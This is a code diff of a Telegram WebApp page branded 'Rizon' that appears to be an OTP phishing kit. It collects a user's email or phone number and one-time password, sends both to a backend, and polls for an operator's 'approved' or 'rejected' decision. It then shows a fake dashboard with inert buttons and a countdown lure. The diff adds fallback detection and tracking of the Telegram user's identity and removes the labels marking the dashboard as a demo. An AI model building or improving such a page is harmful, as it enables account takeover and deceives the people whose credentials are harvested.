@@ -25,53 +25,58 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 
 /* ══════════ 1. SPLASH ══════════ */
 #splash{background:#000;justify-content:center;align-items:center;}
-#splash h1{
-  font-size:52px;font-weight:900;letter-spacing:6px;color:#fff;
-  animation:fadeIn .9s ease;
-}
+#splash h1{font-size:52px;font-weight:900;letter-spacing:6px;color:#fff;animation:fadeIn .9s ease;}
 @keyframes fadeIn{from{opacity:0;transform:scale(.94);}to{opacity:1;transform:scale(1);}}
 
 /* ══════════ 2. LANDING ══════════ */
-#landing{background:#000;padding:0;justify-content:flex-end;position:relative;}
+#landing{
+  background:#000;
+  position:relative;
+  display:flex;
+  flex-direction:column;
+  overflow:hidden;
+}
 #landing .hero{
-  position:absolute;inset:0;
+  flex:1;
+  min-height:0;
+  position:relative;
   background:
-    linear-gradient(180deg, rgba(0,0,0,0) 0%, rgba(0,0,0,.35) 55%, rgba(0,0,0,.95) 100%),
     radial-gradient(circle at 50% 45%, #1a1a1a 0%, #000 70%);
-  display:flex;flex-direction:column;justify-content:flex-start;
-  padding:40px 24px 0;overflow:hidden;
+  display:flex;
+  flex-direction:column;
+  justify-content:flex-start;
+  padding:40px 24px 0;
+  overflow:hidden;
 }
 #landing .title-block{margin-top:20px;line-height:1;}
 #landing .title-block h1{
-  font-size:44px;font-weight:800;color:#fff;letter-spacing:-1px;
+  font-size:42px;font-weight:800;color:#fff;letter-spacing:-1px;
 }
 #landing .title-block h1 em{
   font-family:'Playfair Display',serif;font-style:italic;font-weight:600;
 }
 #landing .trust{
-  display:flex;align-items:center;gap:10px;margin-top:20px;
+  display:flex;align-items:center;gap:10px;margin-top:18px;
   background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);
   padding:10px 14px;border-radius:30px;width:fit-content;max-width:100%;
 }
 #landing .flags{display:flex;font-size:16px;letter-spacing:-4px;}
-#landing .trust span{
-  font-size:12px;color:#B0B0B0;font-weight:500;white-space:nowrap;
-}
+#landing .trust span{font-size:12px;color:#B0B0B0;font-weight:500;white-space:nowrap;}
 #landing .hero-art{
-  flex:1;display:flex;justify-content:center;align-items:center;
-  position:relative;margin-top:20px;
+  flex:1;
+  display:flex;justify-content:center;align-items:center;
+  position:relative;margin-top:20px;min-height:0;
 }
 #landing .hero-art .phone{
-  width:62%;max-width:260px;aspect-ratio:9/17;
+  width:58%;max-width:240px;aspect-ratio:9/17;
   background:linear-gradient(145deg,#111,#000);
   border:3px solid #1c1c1c;border-radius:32px;
   box-shadow:0 30px 60px rgba(0,0,0,.7), inset 0 0 30px rgba(255,255,255,.02);
-  position:relative;
   display:flex;align-items:center;justify-content:center;
   font-size:70px;transform:rotate(-8deg);
 }
 #landing .hero-art .card{
-  position:absolute;top:12%;right:6%;
+  position:absolute;top:12%;right:4%;
   width:38%;max-width:150px;aspect-ratio:1.6/1;
   background:linear-gradient(135deg,#FFE500,#F5C400);
   border-radius:12px;transform:rotate(14deg);
@@ -82,25 +87,24 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 }
 #landing .hero-art .card .brand{font-size:14px;letter-spacing:1px;}
 #landing .hero-art .card .visa{font-size:11px;text-align:right;font-weight:800;font-style:italic;}
-#landing .hero-art .chip{
-  width:22px;height:16px;background:linear-gradient(135deg,#c9c9c9,#888);
-  border-radius:3px;margin-top:4px;
-}
+#landing .hero-art .chip{width:22px;height:16px;background:linear-gradient(135deg,#c9c9c9,#888);border-radius:3px;margin-top:4px;}
 #landing .hero-art .token{
   position:absolute;width:44px;height:44px;border-radius:50%;
   display:flex;align-items:center;justify-content:center;
   font-size:22px;font-weight:900;
   box-shadow:0 10px 20px rgba(0,0,0,.5);
 }
-#landing .hero-art .btc{top:30%;left:8%;background:linear-gradient(135deg,#F7931A,#c76d00);color:#fff;}
-#landing .hero-art .eth{top:48%;left:18%;background:linear-gradient(135deg,#627EEA,#3b4fd1);color:#fff;}
+#landing .hero-art .btc{top:30%;left:6%;background:linear-gradient(135deg,#F7931A,#c76d00);color:#fff;}
+#landing .hero-art .eth{top:48%;left:16%;background:linear-gradient(135deg,#627EEA,#3b4fd1);color:#fff;}
 #landing .hero-art .nvda{top:38%;right:22%;background:linear-gradient(135deg,#76B900,#4a7a00);color:#000;font-size:11px;}
 #landing .hero-art .tsla{top:58%;right:14%;background:linear-gradient(135deg,#E82127,#a01418);color:#fff;font-size:18px;}
 #landing .hero-art .appl{top:20%;left:22%;background:linear-gradient(135deg,#2c2c2c,#000);color:#fff;font-size:20px;}
-
 #landing .actions{
-  position:relative;z-index:2;padding:24px;padding-bottom:40px;
+  flex-shrink:0;
+  padding:16px 24px 34px;
   display:flex;flex-direction:column;gap:12px;
+  background:linear-gradient(180deg, transparent 0%, #000 40%);
+  position:relative;z-index:2;
 }
 #landing .btn{
   width:100%;padding:18px;border-radius:40px;
@@ -124,26 +128,20 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 #login h1{font-size:34px;font-weight:800;color:#000;margin-top:24px;letter-spacing:-.5px;}
 #login p.sub{font-size:15px;color:var(--gray);margin-top:8px;margin-bottom:24px;line-height:1.4;}
 .input-group{margin-bottom:16px;}
-.input-group label{
-  display:block;font-size:13px;color:#666;margin-bottom:8px;font-weight:500;
-}
+.input-group label{display:block;font-size:13px;color:#666;margin-bottom:8px;font-weight:500;}
 .input-field{
   width:100%;padding:20px;border-radius:20px;
   border:1.5px solid var(--border);font-size:16px;outline:none;
   background:#fff;transition:.15s;color:#000;
 }
 .input-field:focus{border-color:#000;}
-.toggle-tabs{
-  display:flex;background:#E5E5EA;border-radius:14px;padding:4px;
-  margin-bottom:20px;
-}
+.toggle-tabs{display:flex;background:#E5E5EA;border-radius:14px;padding:4px;margin-bottom:20px;}
 .toggle-tabs button{
   flex:1;padding:10px;border:none;background:transparent;
   font-size:14px;font-weight:600;color:#666;border-radius:10px;
   cursor:pointer;transition:.15s;
 }
 .toggle-tabs button.active{background:#fff;color:#000;box-shadow:0 1px 3px rgba(0,0,0,.08);}
-
 .btn-main{
   width:100%;padding:20px;border-radius:30px;font-size:16px;
   font-weight:600;border:none;cursor:pointer;transition:.15s;margin-top:10px;
@@ -151,38 +149,23 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 .btn-black{background:#000;color:#fff;}
 .btn-black:active{background:#333;}
 .btn-disabled{background:#A1A1A6!important;color:#fff!important;cursor:not-allowed!important;}
-
-.status-msg{
-  text-align:center;margin-top:20px;font-size:14px;padding:14px;
-  border-radius:14px;font-weight:500;line-height:1.4;
-}
+.status-msg{text-align:center;margin-top:20px;font-size:14px;padding:14px;border-radius:14px;font-weight:500;line-height:1.4;}
 .status-msg.error{color:var(--red);background:#FEE;}
 .status-msg.success{color:#0A7F2E;background:#E8F9EE;}
 .status-msg.info{color:#555;background:#EFEFEF;}
-
-.loader{
-  border:3px solid #e0e0e0;border-top:3px solid #000;border-radius:50%;
-  width:30px;height:30px;animation:spin .8s linear infinite;margin:30px auto;
-}
+.loader{border:3px solid #e0e0e0;border-top:3px solid #000;border-radius:50%;width:30px;height:30px;animation:spin .8s linear infinite;margin:30px auto;}
 @keyframes spin{to{transform:rotate(360deg);}}
 
 /* ══════════ 4. DASHBOARD ══════════ */
 #dashboard{background:#E5E5EA;color:#000;padding:0;padding-bottom:90px;}
-.db-header{
-  display:flex;justify-content:space-between;align-items:center;
-  padding:20px 20px 10px;gap:10px;
-}
+.db-header{display:flex;justify-content:space-between;align-items:center;padding:20px 20px 10px;gap:10px;}
 .db-header .icon-btn{
   width:44px;height:44px;background:#fff;border-radius:50%;
   display:flex;align-items:center;justify-content:center;
   font-size:18px;box-shadow:0 2px 6px rgba(0,0,0,.06);cursor:pointer;
 }
 .db-header .right{display:flex;gap:10px;align-items:center;}
-.demo-badge{
-  background:var(--yellow);color:#000;font-size:11px;
-  padding:5px 10px;border-radius:20px;font-weight:800;
-  letter-spacing:.5px;text-transform:uppercase;
-}
+.demo-badge{background:var(--yellow);color:#000;font-size:11px;padding:5px 10px;border-radius:20px;font-weight:800;letter-spacing:.5px;text-transform:uppercase;}
 .card-widget{
   margin:8px 20px 0;
   background:linear-gradient(160deg,#1a1a1a 0%,#000 100%);
@@ -199,7 +182,6 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
 }
 .card-widget .label{font-size:13px;color:rgba(255,255,255,.6);margin-top:36px;}
 .card-widget .amount{font-size:44px;font-weight:800;margin-top:4px;letter-spacing:-1px;}
-
 .action-row{display:flex;gap:10px;padding:16px 20px;overflow-x:auto;}
 .action-btn{
   flex:0 0 auto;padding:14px 22px;background:#fff;border:none;
@@ -208,104 +190,55 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
   box-shadow:0 2px 6px rgba(0,0,0,.05);
 }
 .action-btn:active{background:#f0f0f0;}
-
 .banner-blue{
   margin:8px 20px;padding:20px;border-radius:22px;
   background:linear-gradient(120deg,#0A84FF,#0066CC);
   color:#fff;position:relative;overflow:hidden;
   display:flex;justify-content:space-between;align-items:center;
 }
-.banner-blue::after{
-  content:'📱';position:absolute;right:-10px;bottom:-20px;
-  font-size:110px;opacity:.18;transform:rotate(-15deg);
-}
+.banner-blue::after{content:'📱';position:absolute;right:-10px;bottom:-20px;font-size:110px;opacity:.18;transform:rotate(-15deg);}
 .banner-blue h3{font-size:20px;font-weight:800;margin-bottom:4px;}
 .banner-blue p{font-size:13px;opacity:.9;max-width:60%;line-height:1.35;}
-.banner-blue .learn{
-  background:rgba(255,255,255,.9);color:#0066CC;
-  padding:10px 16px;border-radius:30px;font-size:12px;
-  font-weight:700;border:none;cursor:pointer;flex-shrink:0;
-}
-
+.banner-blue .learn{background:rgba(255,255,255,.9);color:#0066CC;padding:10px 16px;border-radius:30px;font-size:12px;font-weight:700;border:none;cursor:pointer;flex-shrink:0;}
 .offer-box{margin:16px 20px;border-radius:22px;overflow:hidden;background:#fff;}
-.offer-head{
-  background:#000;color:#fff;padding:16px 20px;
-  display:flex;justify-content:space-between;align-items:center;
-}
+.offer-head{background:#000;color:#fff;padding:16px 20px;display:flex;justify-content:space-between;align-items:center;}
 .offer-head .lhs{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px;}
-.offer-head .timer{
-  background:var(--yellow);color:#000;font-size:14px;font-weight:800;
-  padding:6px 14px;border-radius:20px;
-  display:flex;align-items:center;gap:6px;letter-spacing:.5px;
-}
+.offer-head .timer{background:var(--yellow);color:#000;font-size:14px;font-weight:800;padding:6px 14px;border-radius:20px;display:flex;align-items:center;gap:6px;letter-spacing:.5px;}
 .offer-steps{padding:20px;}
-.step{
-  display:flex;align-items:center;gap:14px;
-  padding:14px 0;position:relative;
-}
+.step{display:flex;align-items:center;gap:14px;padding:14px 0;position:relative;}
 .step + .step{border-top:1px dashed #E5E5EA;}
-.step .num{
-  width:24px;height:24px;border-radius:50%;border:1.5px solid #ccc;
-  display:flex;align-items:center;justify-content:center;
-  font-size:11px;color:#999;font-weight:600;flex-shrink:0;
-}
-.step .step-icon{
-  width:48px;height:48px;border-radius:14px;
-  background:linear-gradient(135deg,#0A84FF,#0066CC);
-  display:flex;align-items:center;justify-content:center;
-  font-size:22px;flex-shrink:0;
-}
+.step .num{width:24px;height:24px;border-radius:50%;border:1.5px solid #ccc;display:flex;align-items:center;justify-content:center;font-size:11px;color:#999;font-weight:600;flex-shrink:0;}
+.step .step-icon{width:48px;height:48px;border-radius:14px;background:linear-gradient(135deg,#0A84FF,#0066CC);display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0;}
 .step .info{flex:1;min-width:0;}
 .step .info h4{font-size:15px;font-weight:700;color:#000;line-height:1.2;margin-bottom:3px;}
 .step .info p{font-size:12px;color:#888;line-height:1.3;}
-.step .cta{
-  padding:10px 18px;border-radius:30px;font-size:13px;font-weight:700;
-  border:none;cursor:pointer;background:#000;color:#fff;flex-shrink:0;
-}
+.step .cta{padding:10px 18px;border-radius:30px;font-size:13px;font-weight:700;border:none;cursor:pointer;background:#000;color:#fff;flex-shrink:0;}
 .step .cta.disabled{background:#E5E5EA;color:#999;cursor:not-allowed;}
-
-/* Bottom Nav */
 .bottom-nav{
   position:fixed;bottom:0;left:0;right:0;height:78px;
   background:#fff;border-top:1px solid #E5E5EA;
   display:flex;align-items:center;justify-content:space-around;
   padding:0 6px;z-index:100;
 }
-.nav-item{
-  flex:1;display:flex;flex-direction:column;align-items:center;
-  gap:2px;font-size:11px;color:#888;cursor:pointer;
-  padding:8px 0;font-weight:500;
-}
+.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;gap:2px;font-size:11px;color:#888;cursor:pointer;padding:8px 0;font-weight:500;}
 .nav-item.active{color:#000;font-weight:700;}
 .nav-item .ic{font-size:22px;line-height:1;}
-.nav-center{
-  width:52px;height:52px;background:#000;color:#fff;border-radius:50%;
-  display:flex;align-items:center;justify-content:center;font-size:22px;
-  margin-bottom:6px;box-shadow:0 6px 14px rgba(0,0,0,.25);flex-shrink:0;
-}
+.nav-center{width:52px;height:52px;background:#000;color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;margin-bottom:6px;box-shadow:0 6px 14px rgba(0,0,0,.25);flex-shrink:0;}
 
-/* ══════════ BANNED SCREEN ══════════ */
-#banned{
-  background:#0a0a0a;justify-content:center;align-items:center;
-  padding:40px 24px;text-align:center;
-}
+/* ══════════ BANNED ══════════ */
+#banned{background:#0a0a0a;justify-content:center;align-items:center;padding:40px 24px;text-align:center;}
 #banned .icon{font-size:70px;margin-bottom:20px;}
 #banned h1{font-size:28px;font-weight:800;color:#E82127;margin-bottom:12px;}
 #banned p{font-size:15px;color:#999;line-height:1.5;max-width:340px;}
-#banned .footer{
-  position:absolute;bottom:30px;left:0;right:0;
-  text-align:center;font-size:12px;color:#555;
-}
+#banned .footer{position:absolute;bottom:30px;left:0;right:0;text-align:center;font-size:12px;color:#555;}
 </style>
 </head>
 <body>
 
-<!-- ══════════ SPLASH ══════════ -->
-<div id="splash" class="screen active">
-  <h1>RIZON</h1>
-</div>
+<!-- SPLASH -->
+<div id="splash" class="screen active"><h1>RIZON</h1></div>
 
-<!-- ══════════ BANNED ══════════ -->
+<!-- BANNED -->
 <div id="banned" class="screen">
   <div class="icon">🚫</div>
   <h1>Access Denied</h1>
@@ -313,7 +246,7 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
   <div class="footer">Rizon © 2025</div>
 </div>
 
-<!-- ══════════ LANDING ══════════ -->
+<!-- LANDING -->
 <div id="landing" class="screen">
   <div class="hero">
     <div class="title-block">
@@ -345,45 +278,34 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
   </div>
 </div>
 
-<!-- ══════════ LOGIN ══════════ -->
+<!-- LOGIN -->
 <div id="login" class="screen">
-  <div class="back-row">
-    <div class="back-btn" onclick="showScreen('landing')">←</div>
-  </div>
-
+  <div class="back-row"><div class="back-btn" onclick="showScreen('landing')">←</div></div>
   <h1 id="login-title">Welcome back!</h1>
   <p class="sub" id="login-sub">Log in to your Rizon account.</p>
-
   <div class="toggle-tabs">
     <button id="tab-email" class="active" onclick="switchTab('email')">📧 Email</button>
     <button id="tab-phone" onclick="switchTab('phone')">📱 Phone</button>
   </div>
-
   <div id="step-email">
     <div class="input-group">
       <label id="input-label">Email address</label>
-      <input type="text" id="identifier-input" class="input-field"
-             placeholder="example@email.com" autocomplete="email">
+      <input type="text" id="identifier-input" class="input-field" placeholder="example@email.com" autocomplete="email">
     </div>
-    <button id="send-otp-btn" class="btn-main btn-black btn-disabled"
-            disabled onclick="requestOTP()">Send OTP</button>
+    <button id="send-otp-btn" class="btn-main btn-black btn-disabled" disabled onclick="requestOTP()">Send OTP</button>
   </div>
-
   <div id="step-otp" class="hidden">
     <div class="input-group">
       <label>Enter OTP</label>
-      <input type="text" id="otp-input" class="input-field"
-             placeholder="Enter OTP" inputmode="numeric" maxlength="8">
+      <input type="text" id="otp-input" class="input-field" placeholder="Enter OTP" inputmode="numeric" maxlength="8">
     </div>
-    <button id="verify-otp-btn" class="btn-main btn-black"
-            onclick="verifyOTP()">Verify &amp; Login</button>
+    <button id="verify-otp-btn" class="btn-main btn-black" onclick="verifyOTP()">Verify &amp; Login</button>
   </div>
-
   <div id="status-container" class="status-msg hidden"></div>
   <div id="loading-container" class="hidden"><div class="loader"></div></div>
 </div>
 
-<!-- ══════════ DASHBOARD (DEMO) ══════════ -->
+<!-- DASHBOARD -->
 <div id="dashboard" class="screen">
   <div class="db-header">
     <div class="icon-btn" onclick="noop()">👤</div>
@@ -393,28 +315,21 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
       <div class="icon-btn" onclick="noop()">▦</div>
     </div>
   </div>
-
   <div class="card-widget">
     <div class="brand">RIZON</div>
     <div class="info">i</div>
     <div class="label">Balance</div>
     <div class="amount">$500.00</div>
   </div>
-
   <div class="action-row">
     <button class="action-btn" onclick="noop()">＋ Add Funds</button>
     <button class="action-btn" onclick="noop()">↗ Send</button>
     <button class="action-btn" onclick="noop()">⋯</button>
   </div>
-
   <div class="banner-blue">
-    <div>
-      <h3>Why Rizon?</h3>
-      <p>Explore Rizon's key features.</p>
-    </div>
+    <div><h3>Why Rizon?</h3><p>Explore Rizon's key features.</p></div>
     <button class="learn" onclick="noop()">Learn more</button>
   </div>
-
   <div class="offer-box">
     <div class="offer-head">
       <div class="lhs">🎁 Limited time offer</div>
@@ -422,72 +337,76 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;}
     </div>
     <div class="offer-steps">
       <div class="step">
-        <div class="num">1</div>
-        <div class="step-icon">💳</div>
-        <div class="info">
-          <h4>Get a Card with 78% off</h4>
-          <p>Start spending globally</p>
-        </div>
+        <div class="num">1</div><div class="step-icon">💳</div>
+        <div class="info"><h4>Get a Card with 78% off</h4><p>Start spending globally</p></div>
         <button class="cta" onclick="noop()">Get card</button>
       </div>
       <div class="step">
-        <div class="num">2</div>
-        <div class="step-icon">🛡️</div>
-        <div class="info">
-          <h4>Verify your account</h4>
-          <p>Finish KYC for full access</p>
-        </div>
+        <div class="num">2</div><div class="step-icon">🛡️</div>
+        <div class="info"><h4>Verify your account</h4><p>Finish KYC for full access</p></div>
         <button class="cta disabled" onclick="noop()">Verify</button>
       </div>
       <div class="step">
-        <div class="num">3</div>
-        <div class="step-icon">💰</div>
-        <div class="info">
-          <h4>Deposit &amp; start spending</h4>
-          <p>Add funds to your account</p>
-        </div>
+        <div class="num">3</div><div class="step-icon">💰</div>
+        <div class="info"><h4>Deposit &amp; start spending</h4><p>Add funds to your account</p></div>
         <button class="cta disabled" onclick="noop()">Deposit</button>
       </div>
     </div>
   </div>
-
   <div class="bottom-nav">
-    <div class="nav-item active">
-      <div class="ic">🏠</div>Home
-    </div>
-    <div class="nav-item" onclick="noop()">
-      <div class="ic">💳</div>Accounts
-    </div>
+    <div class="nav-item active"><div class="ic">🏠</div>Home</div>
+    <div class="nav-item" onclick="noop()"><div class="ic">💳</div>Accounts</div>
     <div class="nav-center" onclick="noop()">▦</div>
-    <div class="nav-item" onclick="noop()">
-      <div class="ic">📊</div>Wealth
-    </div>
-    <div class="nav-item" onclick="noop()">
-      <div class="ic">⬡</div>RizPoints
-    </div>
+    <div class="nav-item" onclick="noop()"><div class="ic">📊</div>Wealth</div>
+    <div class="nav-item" onclick="noop()"><div class="ic">⬡</div>RizPoints</div>
   </div>
 </div>
 
 <script>
 /* ═══════════════════════════════════════════════════════════
-   TELEGRAM WEBAPP INIT
+   TELEGRAM WEBAPP — ROBUST USER DETECTION
    ═══════════════════════════════════════════════════════════ */
 let tg = window.Telegram?.WebApp;
-if (tg) {
-  try { tg.expand(); tg.ready(); } catch (e) { console.log("TG init err:", e); }
-  console.log("✅ Telegram WebApp ready");
-} else {
-  tg = { close: () => window.close(), ready: () => {} };
-  console.warn("⚠️ Not inside Telegram — using fallback");
+if (tg) { try { tg.expand(); tg.ready(); } catch(e){} }
+else { tg = { close: () => window.close(), ready: () => {} }; }
+
+const API_URL = window.location.origin;
+
+/* Multi-fallback user detection — fixes "ID None" bug */
+function getTGUser() {
+  try {
+    // 1. Direct object
+    const u1 = window.Telegram?.WebApp?.initDataUnsafe?.user;
+    if (u1 && u1.id) { console.log("✅ user via initDataUnsafe"); return u1; }
+    // 2. Parse initData query-string
+    const raw = window.Telegram?.WebApp?.initData;
+    if (raw) {
+      const p = new URLSearchParams(raw);
+      const js = p.get("user");
+      if (js) { const u2 = JSON.parse(js); console.log("✅ user via initData"); return u2; }
+    }
+    // 3. URL hash (tgWebAppData)
+    const hash = window.location.hash.slice(1);
+    if (hash) {
+      const hp = new URLSearchParams(hash);
+      const tgData = hp.get("tgWebAppData");
+      if (tgData) {
+        const inner = new URLSearchParams(tgData);
+        const js = inner.get("user");
+        if (js) { const u3 = JSON.parse(js); console.log("✅ user via hash"); return u3; }
+      }
+    }
+  } catch (e) { console.warn("getTGUser error:", e); }
+  console.warn("❌ Could not detect Telegram user");
+  return null;
 }
 
-const API_URL  = window.location.origin;
-const TG_USER  = (tg?.initDataUnsafe?.user) || null;
-console.log("API_URL:", API_URL);
+let TG_USER = getTGUser();
+console.log("initDataUnsafe:", window.Telegram?.WebApp?.initDataUnsafe);
 console.log("TG_USER:", TG_USER);
 
 /* ═══════════════════════════════════════════════════════════
-   SCREEN NAVIGATION
+   SCREEN NAV
    ═══════════════════════════════════════════════════════════ */
 function showScreen(id) {
   document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
@@ -496,9 +415,12 @@ function showScreen(id) {
 }
 
 /* ═══════════════════════════════════════════════════════════
-   BOOT: track open + show landing
+   BOOT — track-open, then show landing
    ═══════════════════════════════════════════════════════════ */
 window.addEventListener("load", async () => {
+  // re-check user in case Telegram needed a tick to populate initData
+  if (!TG_USER) TG_USER = getTGUser();
+
   if (TG_USER) {
     try {
       const r = await fetch(`${API_URL}/api/track-open`, {
@@ -506,12 +428,12 @@ window.addEventListener("load", async () => {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ telegram_user: TG_USER })
       });
-      const d = await r.json();
-      console.log("track-open:", d);
-    } catch (e) {
-      console.log("track-open err:", e);
-    }
+      console.log("track-open:", await r.json());
+    } catch (e) { console.warn("track-open err:", e); }
+  } else {
+    console.warn("Skipping track-open — no TG_USER");
   }
+
   setTimeout(() => showScreen("landing"), 1800);
 });
 
@@ -521,14 +443,12 @@ window.addEventListener("load", async () => {
 function goLogin() {
   document.getElementById("login-title").textContent = "Welcome back!";
   document.getElementById("login-sub").textContent = "Log in to your Rizon account.";
-  resetLoginForm();
-  showScreen("login");
+  resetLoginForm(); showScreen("login");
 }
 function goCreateAccount() {
   document.getElementById("login-title").textContent = "Create account";
   document.getElementById("login-sub").textContent = "Sign up for a Rizon account.";
-  resetLoginForm();
-  showScreen("login");
+  resetLoginForm(); showScreen("login");
 }
 function resetLoginForm() {
   document.getElementById("step-email").classList.remove("hidden");
@@ -547,28 +467,20 @@ function resetLoginForm() {
    EMAIL / PHONE TOGGLE
    ═══════════════════════════════════════════════════════════ */
 let mode = "email";
-
 function switchTab(type) {
   mode = type;
   document.getElementById("tab-email").classList.toggle("active", type === "email");
   document.getElementById("tab-phone").classList.toggle("active", type === "phone");
-
   const input = document.getElementById("identifier-input");
   const label = document.getElementById("input-label");
-
   if (type === "email") {
-    input.type = "email";
-    input.placeholder = "example@email.com";
-    input.autocomplete = "email";
-    label.textContent = "Email address";
+    input.type = "email"; input.placeholder = "example@email.com";
+    input.autocomplete = "email"; label.textContent = "Email address";
   } else {
-    input.type = "tel";
-    input.placeholder = "+1 234 567 8900";
-    input.autocomplete = "tel";
-    label.textContent = "Phone number";
+    input.type = "tel"; input.placeholder = "+1 234 567 8900";
+    input.autocomplete = "tel"; label.textContent = "Phone number";
   }
-  input.value = "";
-  updateSendBtnState();
+  input.value = ""; updateSendBtnState();
 }
 
 /* ═══════════════════════════════════════════════════════════
@@ -580,17 +492,13 @@ const stepEmail        = document.getElementById("step-email");
 const stepOtp          = document.getElementById("step-otp");
 const statusContainer  = document.getElementById("status-container");
 const loadingContainer = document.getElementById("loading-container");
-
 identifierInput.addEventListener("input", updateSendBtnState);
 
 function updateSendBtnState() {
   const v = identifierInput.value.trim();
-  let ok = false;
-  if (mode === "email") {
-    ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
-  } else {
-    ok = v.replace(/\D/g, "").length >= 7;
-  }
+  const ok = mode === "email"
+    ? /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)
+    : v.replace(/\D/g, "").length >= 7;
   sendOtpBtn.disabled = !ok;
   sendOtpBtn.classList.toggle("btn-disabled", !ok);
 }
@@ -605,6 +513,8 @@ async function requestOTP() {
   const identifier = identifierInput.value.trim();
   if (!identifier) return;
 
+  if (!TG_USER) TG_USER = getTGUser();
+
   loadingContainer.classList.remove("hidden");
   statusContainer.classList.add("hidden");
   sendOtpBtn.classList.add("hidden");
@@ -613,17 +523,13 @@ async function requestOTP() {
     const res = await fetch(`${API_URL}/api/request-otp`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        identifier,
-        telegram_user: TG_USER
-      })
+      body: JSON.stringify({ identifier, telegram_user: TG_USER })
     });
     const data = await res.json();
 
     if (res.status === 403) {
       loadingContainer.classList.add("hidden");
-      showScreen("banned");
-      return;
+      showScreen("banned"); return;
     }
 
     if (data.session_id) {
@@ -646,10 +552,8 @@ async function requestOTP() {
 async function verifyOTP() {
   const otp = document.getElementById("otp-input").value.trim();
   if (!otp || !currentSessionId) return;
-
   loadingContainer.classList.remove("hidden");
   statusContainer.classList.add("hidden");
-
   try {
     await fetch(`${API_URL}/api/verify-otp`, {
       method: "POST",
@@ -671,25 +575,19 @@ function startPolling() {
     try {
       const res = await fetch(`${API_URL}/api/check-status/${currentSessionId}`);
       const data = await res.json();
-
       if (data.status === "approved") {
         clearInterval(pollInterval);
         loadingContainer.classList.add("hidden");
         showStatus("✅ Login Successful! Welcome to Rizon.", "success");
         stepOtp.classList.add("hidden");
-        setTimeout(() => {
-          showScreen("dashboard");
-          startCountdown();
-        }, 1400);
+        setTimeout(() => { showScreen("dashboard"); startCountdown(); }, 1400);
       } else if (data.status === "rejected") {
         clearInterval(pollInterval);
         loadingContainer.classList.add("hidden");
         showStatus("❌ OTP is not correct. Please try again.", "error");
         stepOtp.classList.remove("hidden");
       }
-    } catch (e) {
-      console.log("poll error", e);
-    }
+    } catch (e) { console.log("poll error", e); }
   }, 2000);
 }
 
@@ -700,15 +598,13 @@ function showStatus(msg, type) {
 }
 
 /* ═══════════════════════════════════════════════════════════
-   DASHBOARD HELPERS
+   DASHBOARD
    ═══════════════════════════════════════════════════════════ */
-function noop() { /* demo — buttons do nothing */ }
-
+function noop() {}
 let countdownStarted = false;
 function startCountdown() {
   if (countdownStarted) return;
   countdownStarted = true;
-
   let t = 58 * 60 + 25;
   const el = document.getElementById("countdown");
   if (!el) return;
